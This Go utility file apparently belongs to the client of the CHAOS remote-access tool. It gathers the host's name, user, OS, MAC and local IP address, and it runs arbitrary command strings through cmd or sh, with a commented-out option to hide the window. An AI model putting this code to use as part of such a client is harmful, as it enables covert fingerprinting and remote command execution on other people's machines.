package util

import (
	"context"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

func LoadDeviceSpecs() *models.Device {
	hostname, _ := os.Hostname()
	username, _ := user.Current()
	macAddr, _ := network.GetMacAddress()
	return &models.Device{
		Hostname:       hostname,
		Username:       username.Name,
		UserID:         username.Username,
		OSName:         runtime.GOOS,
		MacAddress:     macAddr,
		LocalIPAddress: network.GetLocalIP().String(),
		FetchedUnix:    time.Now().UnixNano(),
	}
}

func RunCmd(cmd string, timeout time.Duration) []byte {
	ctx, cancel := context.WithTimeout(context.Background(), timeout*time.Second)
	defer cancel()

	osType := DetectOS()
	var cmdExec *exec.Cmd
	switch osType {
	case Windows:
		cmdExec = exec.CommandContext(ctx, "cmd", "/C", cmd)
		//cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	case Linux:
		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
	case Darwin:
		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
	default:
		return []byte("os not supported")
	}

	c, err := cmdExec.CombinedOutput()
	if err != nil {
		if ctx.Err() != nil {
			return []byte("command deadline exceeded")
		}
		return c
	}
	return c
}
